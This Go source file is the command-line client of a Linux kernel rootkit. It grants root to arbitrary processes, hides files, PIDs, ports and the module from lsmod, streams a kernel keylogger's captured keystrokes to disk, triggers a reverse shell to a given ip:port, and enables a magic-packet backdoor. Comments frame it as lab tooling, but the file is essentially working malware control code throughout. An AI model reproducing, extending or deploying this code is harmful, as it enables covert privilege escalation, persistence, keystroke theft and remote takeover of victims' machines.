package main

import (
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"

	"github.com/ruby570bocadito/vault-kernel/internal/vaultkernel"
)

const clientVersion = "3.12"

// Poll interval contract of `keylog --follow` (milliseconds), mirrored
// by KEYLOG_DEFAULT_INTERVAL_MS / KEYLOG_MIN_INTERVAL_MS in the Python CLI.
const (
	keylogDefaultIntervalMs = 500
	keylogMinIntervalMs     = 50
)

// watchDefaultIntervalMs is the refresh cadence of `watch` (parity
// with WATCH_DEFAULT_INTERVAL_MS in the Python CLI).
const watchDefaultIntervalMs = 1000

const devicePath = "/dev/vault_kernel"

// sysfsModulePath is where the kernel exposes loaded modules; absence
// (once stats work) means the module is hidden from lsmod/sysfs.
const sysfsModulePath = "/sys/module/vault_kernel"

// usageError marks a GRAMMAR/USAGE failure - missing or extra
// operands, invalid values, violated flag preconditions, unknown
// commands.  Since v3.12 the CLI exit contract is THREE classes wide
// and identical in both clients (parity with argparse, which exits 2
// for its own usage errors):
//
//	0  success
//	1  runtime error (device open, ioctl failure, empty report,
//	   unwritable output file)
//	2  usage error (this type)
//
// main() maps the class to the exit code with errors.As; every error
// that still reaches it as a plain error is runtime by construction.
type usageError struct{ err error }

func (e *usageError) Error() string { return e.err.Error() }
func (e *usageError) Unwrap() error { return e.err }

// usagef is the fmt.Errorf of the grammar layer: it wraps the message
// in a *usageError so main() can tell usage failures (exit 2) from
// runtime ones (exit 1).
func usagef(format string, a ...interface{}) error {
	return &usageError{err: fmt.Errorf(format, a...)}
}

func openDevice() (*os.File, error) {
	f, err := os.OpenFile(devicePath, os.O_RDWR, 0)
	if err != nil {
		return nil, fmt.Errorf("cannot open %s: %w (is rootkit loaded?)", devicePath, err)
	}
	return f, nil
}

// verifyRootSelf reports whether THIS process is root right after the
// GIVE_ROOT ioctl: the ioctl runs in the caller's task context, so
// commit_creds() takes effect on the CLI process itself immediately.
func verifyRootSelf() bool {
	return os.Geteuid() == 0
}

// verifyRootRemote checks the effective uid of another PID through
// /proc/<pid>/status. The Uid: line carries FOUR numbers (real,
// effective, saved, fs); fields[2] is the EFFECTIVE one (the 2nd
// number, 3rd whitespace token counting the "Uid:" label).
func verifyRootRemote(pid int) bool {
	data, err := os.ReadFile(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return false
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "Uid:") {
			fields := strings.Fields(line)
			if len(fields) >= 3 {
				return fields[2] == "0"
			}
		}
	}
	return false
}

// parseGiveRootPID validates the optional PID argument of give-root.
// No argument (or 0) means "self" — the documented kernel contract:
// IOCTL_GIVE_ROOT with pid <= 0 escalates the CALLER.  A non-numeric
// argument is a usage error, NOT a silent self-root: the Python CLI
// (argparse type=int) rejects it and Go must match — before v3.8 the
// strconv.Atoi error was discarded here and `give-root abc` escalated
// SELF instead of erroring.  Extracted as a pure function for
// unit-testing without a device.
func parseGiveRootPID(args []string) (int, error) {
	if len(args) == 0 {
		return 0, nil
	}
	if len(args) > 1 {
		return 0, usagef("usage: vault_kernel give-root [pid]")
	}
	pid, err := strconv.Atoi(args[0])
	if err != nil {
		return 0, usagef("invalid PID: %s (numeric PID, or none for self)", args[0])
	}
	return pid, nil
}

// strictArgs is the v3.9 grammar floor for simple commands: exactly
// `want` positional arguments — missing or EXTRA arguments are usage
// errors, never silently ignored (v3.9 audit: 15 of 20 dispatcher
// cases swallowed excess args while the Python/argparse client
// rejects them).  `usage` is printed verbatim on mismatch.
func strictArgs(args []string, want int, usage string) error {
	if len(args) > want {
		return usagef("%s (unexpected argument: %s)", usage, args[want])
	}
	if len(args) < want {
		return usagef("%s", usage)
	}
	return nil
}

// posixOperandArgs applies the POSIX end-of-options convention to the
// positional-operand commands, closing the v3.11 parity gap with the
// argparse surface of the Python client (verified cell by cell):
//
//	args           -> verbatim (no escape present)
//	["--", "-foo"] -> ["-foo"]   the escape hands it to the operand
//	["-foo"]       -> ERROR      argparse: "no such option: -foo"
//	["-"]          -> verbatim   POSIX stdin-style operand, accepted
//	["-5"]         -> verbatim   negative numbers stay operands
//	                              (give-root's pid<=0 = self)
//
// Before v3.11 Go accepted the bare "-foo" form the Python client
// rejects (the kernel received a flag-looking name) and rejected the
// "--" form the Python client accepts (strictArgs counted the marker
// as an unexpected extra operand): the same command, two grammars.
func posixOperandArgs(args []string) ([]string, error) {
	if len(args) == 0 {
		return args, nil
	}
	if args[0] == "--" {
		return args[1:], nil
	}
	if len(args[0]) > 1 && strings.HasPrefix(args[0], "-") && !looksNegativeNumber(args[0]) {
		return nil, usagef("unknown option: %s (use '-- %s' to pass it as an operand)", args[0], args[0])
	}
	return args, nil
}

// looksNegativeNumber reports whether s is a negative number literal
// ("-5", "-3.5"): argparse keeps such tokens as POSITIONAL values when
// the parser registers no negative-number-like options, so give-root
// -5 must keep working in both clients.
func looksNegativeNumber(s string) bool {
	if s == "" || s[0] != '-' {
		return false
	}
	_, err := strconv.ParseFloat(s, 64)
	return err == nil
}

// validateFileName is the pre-device value check of hide-file and
// unhide-file (v3.12): empty names and names beyond the kernel's
// 255-byte hide-list are USAGE errors (exit 2), reported without
// opening the device -- the Python client rejects the same values via
// _reject before opening too.  Pure.
func validateFileName(name string) error {
	if name == "" {
		return usagef("file name cannot be empty")
	}
	if len(name) > 255 {
		return usagef("name too long (%d bytes): the kernel hide-list stores at most 255", len(name))
	}
	return nil
}

// validateMagicWord is the pre-device value check of `magic` -- same
// contract as validateFileName (the module stores at most 15 chars).
// Pure.
func validateMagicWord(word string) error {
	if word == "" {
		return usagef("magic word cannot be empty (an empty word disables the backdoor only via reset)")
	}
	if len(word) > 15 {
		return usagef("magic word too long (%d chars): module stores at most 15", len(word))
	}
	return nil
}

// parseFlagOnly is the strict grammar of commands whose ONLY argument
// is one optional flag (doctor/list/stats --json): no flag, the flag
// once, or a usage error — anything else was silently ignored before
// v3.9 (`list extra` listed as if bare).
func parseFlagOnly(args []string, flag, usage string) (bool, error) {
	if len(args) == 0 {
		return false, nil
	}
	if len(args) == 1 && args[0] == flag {
		return true, nil
	}
	return false, usagef("usage: %s", usage)
}

// parsePIDArg validates a REQUIRED pid operand of hide-pid/unhide-pid:
// numeric and >= 1.  Before v3.9 both clients accepted 0/negative
// PIDs, which the module stores verbatim in the hide-list ("pid: -5"
// in `list`) although nothing can ever match them (hooked_kill filters
// pid > 0 only).  Pure and unit-testable without a device.
func parsePIDArg(s string) (int, error) {
	pid, err := strconv.Atoi(s)
	if err != nil {
		return 0, usagef("invalid PID: %s (numeric, >= 1)", s)
	}
	if pid < 1 {
		return 0, usagef("invalid PID: %d (must be >= 1)", pid)
	}
	return pid, nil
}

// parsePortArg validates a REQUIRED port operand (hide-port,
// unhide-port and magic-encode): 1-65535.  Extracted from the
// dispatcher, where the same check was duplicated three times, as a
// pure function (v3.9).
func parsePortArg(s string) (uint16, error) {
	p, err := strconv.Atoi(s)
	if err != nil || p < 1 || p > 65535 {
		return 0, usagef("invalid port: %s", s)
	}
	return uint16(p), nil
}

// parseShellTarget validates the `shell <ip:port>` operand BEFORE
// hitting the device: non-empty host, numeric port 1-65535, split at
// the LAST colon.  Before v3.9 Go only checked "contains :" (so
// `abc:def` reached the kernel and died with a raw EINVAL) and the
// Python client validated nothing — the module's first-colon split was
// the only barrier.  IPv6 literals are NOT supported by design: the
// module splits at the FIRST colon, so this parser rejects them with a
// clear client-side error instead.  Pure and unit-testable.
func parseShellTarget(target string) error {
	if target == "" {
		return usagef("usage: vault_kernel shell <ip:port>")
	}
	// Exactly ONE colon: the module splits at the FIRST colon, so
	// anything with 2+ colons (IPv6 literals included, `a:b:44`)
	// would reach it as a mangled host/port pair — rejected here
	// with a clear client-side error instead.
	if strings.Count(target, ":") != 1 {
		return usagef("invalid target %q: use ip:port (IPv6 not supported)", target)
	}
	i := strings.Index(target, ":")
	if i == 0 || i == len(target)-1 {
		return usagef("invalid target %q: empty host or port", target)
	}
	// v3.12: the 255-byte kernel-buffer check moves UP from
	// backdoorShell into the grammar (usage class, reported without
	// touching the device; the Python _reject fires pre-open too).
	if len(target) > 255 {
		return usagef("target too long (%d bytes): kernel buffer stores at most 255", len(target))
	}
	port, err := strconv.Atoi(target[i+1:])
	if err != nil || port < 1 || port > 65535 {
		return usagef("invalid port in target %q: %s", target, target[i+1:])
	}
	return nil
}

func giveRoot(f *os.File, pid int) error {
	if pid == 0 {
		pid = os.Getpid()
	}
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GIVE_ROOT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	if pid == os.Getpid() {
		// The module ran commit_creds() on our own task — verify it.
		if verifyRootSelf() {
			fmt.Printf("[+] Granted root to PID %d (verified: euid=0)\n", pid)
		} else {
			fmt.Printf("[?] ioctl succeeded but euid is still %d — check dmesg\n", os.Geteuid())
		}
		return nil
	}
	fmt.Printf("[+] Granted root to PID %d\n", pid)
	if verifyRootRemote(pid) {
		fmt.Printf("    Verified via /proc/%d/status: euid=0\n", pid)
	} else {
		fmt.Printf("    (could not verify euid via /proc/%d/status)\n", pid)
	}
	return nil
}

func hideFile(f *os.File, name string) error {
	// v3.12: value validation lives in validateFileName (usage class,
	// fired pre-device by the dispatcher); kept here as defense.
	if err := validateFileName(name); err != nil {
		return err
	}
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding file/dir: %s\n", name)
	return nil
}

func unhideFile(f *os.File, name string) error {
	// v3.12: same defense as hideFile.
	if err := validateFileName(name); err != nil {
		return err
	}
	buf := make([]byte, 256)
	copy(buf, name)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_FILE, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed: %s\n", name)
	return nil
}

func hidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding PID: %d\n", pid)
	return nil
}

func unhidePID(f *os.File, pid int) error {
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, uint32(pid))
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PID, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed PID: %d\n", pid)
	return nil
}

func hidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_HIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Hiding port: %d\n", port)
	return nil
}

func unhidePort(f *os.File, port uint16) error {
	buf := make([]byte, 2)
	binary.LittleEndian.PutUint16(buf, port)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_UNHIDE_PORT, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[-] Revealed port: %d\n", port)
	return nil
}

func listHidden(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(nothing hidden)")
	} else {
		fmt.Print(output)
	}
	return nil
}

// listHiddenJSON emits the LIST_HIDDEN report as JSON for lab scripts:
// {"schema": 1, "pids": [...], "files": [...], "ports": [...]}.  Empty
// sections marshal as [] (the parser returns non-nil slices).
func listHiddenJSON(f *os.File) error {
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&buf[0])); err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	j, err := marshalHiddenJSON(ioctl.ParseHiddenList(output))
	if err != nil {
		return err
	}
	fmt.Println(string(j))
	return nil
}

func keylogRead(f *os.File, outPath string) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("[*] (no keystrokes captured)")
	} else {
		fmt.Printf("[*] Keystroke log:\n%s\n", output)
	}
	if outPath != "" && output != "" {
		// v3.9: persist the buffer as one record; same append+flush
		// contract as the follow stream (keylogSink).
		sink, err := newKeylogSink(outPath)
		if err != nil {
			return err
		}
		defer sink.close()
		if err := sink.writeRecord(output + "\n"); err != nil {
			return err
		}
	}
	return nil
}

// keylogOpts is the parsed argument set of the `keylog` command.
type keylogOpts struct {
	follow     bool
	timestamps bool
	intervalMs int
	outputPath string
	stopAfter  int // v3.11: stop cleanly after N follow events (0 = unlimited)
}

// parseKeylogArgs owns the `keylog` argument grammar:
//
//	keylog [--follow [ms]] [--timestamps] [--output FILE]
//
// The poll interval stays POSITIONAL after --follow (documented contract
// since v3.5, mirroring the Python CLI's --interval); --timestamps and
// --output may appear anywhere; --timestamps without --follow is a usage
// error in BOTH clients.  v3.9 adds --output FILE: exactly one FILE
// operand, required when the flag is present (a second --output, a
// missing operand or an empty path is a usage error, same strictness as
// the positional interval).  Extracted as a pure function so the grammar
// is unit-testable without a device (v3.8 — before, any arg that was not
// `--follow` was silently ignored in the one-shot path).  v3.10 adds the
// flag-value rule: a FILE operand starting with '-' is rejected.
// v3.11 adds --stop-after N (follow only, N >= 1, at most once): the
// follow loop stops cleanly after the Nth emitted event — finite
// capture windows for scripts.  Without --follow it is a usage error
// (same rule as --timestamps: the one-shot reads exactly one buffer).
func parseKeylogArgs(args []string) (keylogOpts, error) {
	opts := keylogOpts{intervalMs: keylogDefaultIntervalMs}
	seenInterval := false
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--follow":
			opts.follow = true
		case "--timestamps":
			opts.timestamps = true
		case "--stop-after":
			if i+1 >= len(args) {
				return opts, usagef("--stop-after requires an N operand")
			}
			if opts.stopAfter != 0 {
				return opts, usagef("--stop-after given more than once")
			}
			i++
			n, err := strconv.Atoi(args[i])
			if err != nil || n < 1 {
				return opts, usagef("invalid --stop-after: %s (events, >= 1)", args[i])
			}
			opts.stopAfter = n
		case "--output":
			if i+1 >= len(args) {
				return opts, usagef("--output requires a FILE operand")
			}
			if opts.outputPath != "" {
				return opts, usagef("--output given more than once")
			}
			i++
			opts.outputPath = args[i]
			if opts.outputPath == "" || strings.HasPrefix(opts.outputPath, "-") {
				// v3.10: a flag-like token is a MISSING operand, never a
				// file called "--follow" (parity with argparse, which
				// rejects the same input with "expected one argument").
				// A real path starting with '-' needs the ./- escape.
				return opts, usagef("--output requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", opts.outputPath)
			}
		default:
			if !opts.follow || seenInterval {
				return opts, usagef("usage: vault_kernel keylog [--follow [ms]] [--timestamps] [--output FILE] [--stop-after N]")
			}
			n, err := strconv.Atoi(args[i])
			if err != nil || n < keylogMinIntervalMs {
				return opts, usagef("invalid interval: %s (milliseconds, min %d)", args[i], keylogMinIntervalMs)
			}
			opts.intervalMs = n
			seenInterval = true
		}
	}
	if opts.timestamps && !opts.follow {
		return opts, usagef("--timestamps requires --follow")
	}
	if opts.stopAfter != 0 && !opts.follow {
		return opts, usagef("--stop-after requires --follow")
	}
	return opts, nil
}

// parseCaptureArgs owns the `capture` argument grammar (v3.9,
// extended in v3.11 with --stdout):
//
//	capture [--out FILE] [--stdout]
//
// Strict like the rest of the v3.8/v3.9 grammars: --out takes exactly
// one FILE operand and may appear at most once (v3.10: a FILE operand
// starting with '-' is rejected); --stdout is a boolean flag and may
// also appear at most once; any other token is a usage error.
// Without --out the bundle goes to stdout. With BOTH --out and
// --stdout the file is written AND the JSON document is printed to
// stdout (the one-line summary moves to stderr, so `capture --out f
// --stdout | jq` stays a clean JSON pipeline). --stdout without --out
// is accepted and redundant — lab scripts can pass it unconditionally.
func parseCaptureArgs(args []string) (string, bool, error) {
	outPath := ""
	forceStdout := false
	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--out":
			if i+1 >= len(args) {
				return "", false, usagef("--out requires a FILE operand")
			}
			if outPath != "" {
				return "", false, usagef("--out given more than once")
			}
			i++
			outPath = args[i]
			if outPath == "" || strings.HasPrefix(outPath, "-") {
				// v3.10: same flag-value rule as --output — `capture
				// --out --json` used to eat --json as the path.
				return "", false, usagef("--out requires a FILE operand (got %q; paths starting with '-' need a ./ prefix)", outPath)
			}
		case "--stdout":
			if forceStdout {
				return "", false, usagef("--stdout given more than once")
			}
			forceStdout = true
		default:
			return "", false, usagef("usage: vault_kernel capture [--out FILE] [--stdout]")
		}
	}
	return outPath, forceStdout, nil
}

// emitCaptureBundle delivers an already-marshalled evidence bundle
// (pure aside from the file write, so the delivery matrix is
// unit-testable with a temp directory — v3.11):
//
//	outPath empty          -> JSON to stdout
//	outPath + no --stdout  -> file 0600, one-line summary to stdout
//	outPath + --stdout     -> file 0600, JSON to stdout, summary to
//	                          stderr (stdout stays pure JSON for jq)
func emitCaptureBundle(j []byte, outPath string, forceStdout bool) error {
	if outPath == "" {
		fmt.Println(string(j))
		return nil
	}
	if err := os.WriteFile(outPath, append(j, '\n'), 0600); err != nil {
		return fmt.Errorf("capture: cannot write %s: %w", outPath, err)
	}
	summary := fmt.Sprintf("[+] Evidence bundle written to %s (%d bytes)\n", outPath, len(j)+1)
	if forceStdout {
		fmt.Println(string(j))
		fmt.Fprint(os.Stderr, summary)
	} else {
		fmt.Print(summary)
	}
	return nil
}

// formatKeylogEvent renders one follow event — mirrors
// format_keylog_event() in the Python CLI (contract pinned by tests in
// BOTH clients).  With timestamps every event starts on a fresh line
// prefixed with the POLL time ([HH:MM:SS]) — the module's buffer
// carries no per-keystroke time, so the poll time is the honest lower
// bound.  Without them the historical behaviour is kept: a suffix diff
// continues the current line and a buffer wrap starts a new one.
func formatKeylogEvent(newText, ts string, timestamps, wrapped bool) string {
	if timestamps {
		return "\n[" + ts + "] " + newText
	}
	if wrapped {
		return "\n" + newText
	}
	return newText
}

// keylogSink is the --output persistence of the keylog stream: one
// append-only file, flushed per event. The file is created 0600 —
// captures may contain keystrokes. Pure enough to unit-test with a
// temp directory (the follow loop only feeds it records).
type keylogSink struct {
	f *os.File
}

func newKeylogSink(path string) (*keylogSink, error) {
	f, err := os.OpenFile(path, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0600)
	if err != nil {
		return nil, fmt.Errorf("cannot open keylog output %s: %w", path, err)
	}
	return &keylogSink{f: f}, nil
}

func (s *keylogSink) writeRecord(rec string) error {
	if _, err := s.f.WriteString(rec); err != nil {
		return fmt.Errorf("keylog output write failed: %w", err)
	}
	return s.f.Sync()
}

func (s *keylogSink) close() {
	s.f.Close()
}

// keylogFollow polls KEYLOG_READ and streams new keystrokes as they
// arrive.  The module's buffer shifts left when full, so a suffix
// diff is printed when the common prefix breaks (buffer wrap).
// With outputPath (v3.9) every emitted event is ALSO appended to the
// file and flushed — the exact bytes printed to the terminal, so the
// file is a faithful transcript (timestamps included when active).
// Since v3.10 BOTH Ctrl-C and SIGTERM stop the loop cleanly with a
// farewell line (parity with the Python client, which always had the
// message): systemd/pkill -TERM no longer cut the stream mid-write.
// v3.11: with stopAfter > 0 the loop returns cleanly after the Nth
// emitted event (same farewell path as the signals) — finite capture
// windows for scripts.
func keylogFollow(f *os.File, intervalMs int, timestamps bool, outputPath string, stopAfter int) error {
	var sink *keylogSink
	if outputPath != "" {
		var err error
		sink, err = newKeylogSink(outputPath)
		if err != nil {
			return err
		}
		defer sink.close()
		fmt.Printf("[*] Recording to %s\n", outputPath)
	}
	if stopAfter > 0 {
		fmt.Printf("[*] Following keystroke log (poll %d ms, stop after %d events) — Ctrl-C to stop\n", intervalMs, stopAfter)
	} else {
		fmt.Printf("[*] Following keystroke log (poll %d ms) — Ctrl-C to stop\n", intervalMs)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sig)

	prev := ""
	emitted := 0
	for {
		buf := make([]byte, 4096)
		if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_READ, unsafe.Pointer(&buf[0])); err != 0 {
			return err
		}
		cur := strings.TrimRight(string(buf), "\x00")
		if cur != prev {
			newText := cur
			wrapped := false
			if len(cur) >= len(prev) && strings.HasPrefix(cur, prev) {
				newText = cur[len(prev):]
			} else {
				wrapped = true
			}
			event := formatKeylogEvent(newText, time.Now().Format("15:04:05"), timestamps, wrapped)
			fmt.Print(event)
			if sink != nil {
				if err := sink.writeRecord(event + "\n"); err != nil {
					return err
				}
			}
			prev = cur
			emitted++
			if stopAfter > 0 && emitted >= stopAfter {
				fmt.Println("\n[*] Follow stopped")
				return nil
			}
		}
		select {
		case <-sig:
			fmt.Println("\n[*] Follow stopped")
			return nil
		case <-time.After(time.Duration(intervalMs) * time.Millisecond):
		}
	}
}

// runWatch drives the `watch` command: clear the screen and repaint
// stats + hidden list every intervalMs until Ctrl-C or SIGTERM (both
// stop cleanly since v3.10). Rendering itself lives in
// ioctl.RenderWatchPanelDiff (pure, unit-tested); this function only
// owns the refresh loop, the prev-stats threading that powers the
// change annotations, and console cursor restoration. With Once it
// delegates to watchOnce (single frame, no ANSI control sequences).
func runWatch(f *os.File, opts watchOpts) error {
	if opts.once {
		return watchOnce(f, opts.intervalMs)
	}

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt, syscall.SIGTERM)
	defer signal.Stop(sig)

	// Hide the cursor for the repaint loop; ALWAYS restore it on exit.
	fmt.Print("\x1b[?25l")
	defer fmt.Print("\x1b[?25h")

	statsBuf := make([]byte, 4096)
	listBuf := make([]byte, 4096)
	var prevStats map[string]string
	for frame := 1; ; frame++ {
		stats, panel, err := watchFrame(f, statsBuf, listBuf, prevStats, opts.intervalMs)
		if err != nil {
			return err
		}
		// ANSI: clear screen + home cursor, then the frame.
		fmt.Print("\x1b[2J\x1b[H")
		fmt.Print(panel)
		prevStats = stats

		// v3.12: --count N ends the stream after the Nth frame with
		// the SAME farewell as the signals — finite watch windows for
		// lab reports (symmetric with keylog --stop-after).
		if opts.count > 0 && frame >= opts.count {
			fmt.Println("[*] watch stopped")
			return nil
		}

		select {
		case <-sig:
			fmt.Println("[*] watch stopped")
			return nil
		case <-time.After(time.Duration(opts.intervalMs) * time.Millisecond):
		}
	}
}

// watchOnce renders a single watch frame to stdout WITHOUT any ANSI
// control sequences — the `watch --once` snapshot (v3.10) for scripts,
// CI diagnostics and reports: the panel lands in the scrollback like
// any other command output and the exit code reflects the ioctls.
func watchOnce(f *os.File, intervalMs int) error {
	stats, panel, err := watchFrame(f, make([]byte, 4096), make([]byte, 4096), nil, intervalMs)
	if err != nil {
		return err
	}
	_ = stats
	fmt.Print(panel)
	return nil
}

// watchFrame performs one GET_STATS + LIST_HIDDEN round and renders
// the panel. prevStats (nil on the first frame / in --once) enables
// the change annotations of RenderWatchPanelDiff; the parsed stats
// return value feeds the next iteration's prev.
func watchFrame(f *os.File, statsBuf, listBuf []byte, prevStats map[string]string, intervalMs int) (map[string]string, string, error) {
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&statsBuf[0])); err != 0 {
		return nil, "", err
	}
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_LIST_HIDDEN, unsafe.Pointer(&listBuf[0])); err != 0 {
		return nil, "", err
	}
	stats := ioctl.ParseStatsReport(strings.TrimRight(string(statsBuf), "\x00"))
	panel := ioctl.RenderWatchPanelDiff(
		stats,
		prevStats,
		ioctl.ParseHiddenList(strings.TrimRight(string(listBuf), "\x00")),
		intervalMs,
		time.Now().Format("15:04:05"),
	)
	return stats, panel, nil
}

func keylogClear(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_KEYLOG_CLEAR, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Keylogger buffer cleared")
	return nil
}

func backdoorShell(f *os.File, target string) error {
	// v3.12: the length check moved up to parseShellTarget; kept as
	// defense in depth.
	if len(target) > 255 {
		return usagef("target too long (%d bytes): kernel buffer stores at most 255", len(target))
	}
	buf := make([]byte, 256)
	copy(buf, target)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_SHELL, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Reverse shell triggered -> %s\n", target)
	return nil
}

func backdoorMagic(f *os.File, word string) error {
	// v3.12: value validation lives in validateMagicWord (usage class,
	// fired pre-device by the dispatcher); kept here as defense.
	if err := validateMagicWord(word); err != nil {
		return err
	}
	buf := make([]byte, 16)
	copy(buf, word)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_BACKDOOR_MAGIC, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	fmt.Printf("[+] Magic packet backdoor enabled: '%s'\n", word)
	return nil
}

func hideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_HIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Module hidden from lsmod")
	return nil
}

func unhideModule(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_MODULE_UNHIDE, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[-] Module visible again in lsmod")
	return nil
}

func resetAll(f *os.File) error {
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_RESET_ALL, unsafe.Pointer(nil))
	if err != 0 {
		return err
	}
	fmt.Println("[+] Reset: all hidden files, PIDs and ports cleared")
	return nil
}

func showStats(f *os.File) error {
	buf := make([]byte, 4096)
	_, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0]))
	if err != 0 {
		return err
	}
	output := strings.TrimRight(string(buf), "\x00")
	if output == "" {
		fmt.Println("(no stats returned)")
	} else {
		fmt.Print(output)
	}
	return nil
}

// showStatsJSON re-emits the GET_STATS key=value report as JSON so
// lab scripts can consume it without text munging. Numeric values
// are converted to JSON numbers, the rest stay strings.
// v3.6: parsing goes through the shared token-based ParseStatsReport —
// the previous line-based split lost every pair after the first on
// each line (version, hooks_planned, hidden_pids, hidden_ports).
func showStatsJSON(f *os.File) error {
	buf := make([]byte, 4096)
	if _, err := ioctl.Raw(f.Fd(), ioctl.IOCTL_GET_STATS, unsafe.Pointer(&buf[0])); err != 0 {
		return err
	}
	raw := ioctl.ParseStatsReport(strings.TrimRight(string(buf), "\x00"))
	if len(raw) == 0 {
		return fmt.Errorf("module returned an empty stats report")
	}
	j, err := marshalStatsJSON(raw)
	if err != nil {
		return err
	}
	fmt.Println(string(j))
	return nil
}

// jsonSchemaVersion is the version of the machine-readable output
// envelope shared by `stats --json`, `list --json` and `doctor --json`
// in BOTH clients (Go and Python). Bump it whenever a field changes
// meaning or shape; additive fields keep it at 1 (v3.7 added it).
const jsonSchemaVersion = 1

// statsMap converts a parsed GET_STATS report into the JSON-ready
// value map shared by `stats --json` (marshalStatsJSON) and the
// `capture` evidence bundle (buildCaptureReport): numeric values
// become numbers, the rest stay strings. Keep the conversion in ONE
// place so both documents treat a future key identically.
func statsMap(raw map[string]string) map[string]interface{} {
	out := make(map[string]interface{}, len(raw)+1)
	for k, v := range raw {
		if n, err := strconv.Atoi(v); err == nil {
			out[k] = n
		} else {
			out[k] = v
		}
	}
	return out
}

// marshalStatsJSON converts a parsed GET_STATS report into the versioned
// JSON envelope. Numeric values become JSON numbers, the rest stay
// strings. Extracted from showStatsJSON as a pure function so the
// envelope is unit-testable without a device.
func marshalStatsJSON(raw map[string]string) ([]byte, error) {
	out := statsMap(raw)
	out["schema"] = jsonSchemaVersion
	return json.MarshalIndent(out, "", "  ")
}

// captureReport is the `capture` evidence bundle: a single JSON
// document freezing the module state for a lab report. Field order is
// contractual (SCHEMAS.md); stats reuses the stats --json conversion
// (numbers where numeric, keys sorted by the JSON encoder).
type captureReport struct {
	Schema        int                    `json:"schema"`
	CapturedAt    string                 `json:"captured_at"`
	ClientVersion string                 `json:"client_version"`
	Hostname      string                 `json:"hostname"`
	KernelRelease string                 `json:"kernel_release"`
	ModuleInSysfs bool                   `json:"module_in_sysfs"`
	Stats         map[string]interface{} `json:"stats"`
	Hidden        ioctl.HiddenList       `json:"hidden"`
	Keylog        string                 `json:"keylog"`
}

// buildCaptureReport assembles the evidence bundle from already-parsed
// inputs — pure, so the envelope is unit-testable without a device
// (v3.9). Callers own the ioctls and the timestamp: capturedAt is the
// UTC RFC3339 instant of the SNAPSHOT, taken after the buffers were
// read.  v3.12 adds the host context (hostname, kernel_release —
// WHERE a snapshot was taken, the first question of any lab reviewer);
// both fields are ADDITIVE so the schema envelope stays at 1.
func buildCaptureReport(statsRaw map[string]string, hidden ioctl.HiddenList, keylogText, capturedAt string, moduleInSysfs bool, clientVer, hostname, kernelRelease string) captureReport {
	stats := statsMap(statsRaw)
	return captureReport{
		Schema:        jsonSchemaVersion,
		CapturedAt:    capturedAt,
		ClientVersion: clientVer,
